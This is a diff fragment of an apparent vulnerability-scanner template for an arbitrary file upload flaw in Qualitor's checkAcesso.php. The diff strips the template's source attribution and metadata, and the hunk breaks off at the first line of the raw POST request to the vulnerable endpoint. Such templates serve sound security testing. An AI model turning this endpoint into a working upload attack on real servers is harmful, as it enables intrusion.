@@ -3,11 +3,8 @@ info:
   name: Qualitor-checkAcesso任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zw7g51uctxggnex1'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zw7g51uctxggnex1
 http:
 - raw:
   - 'POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
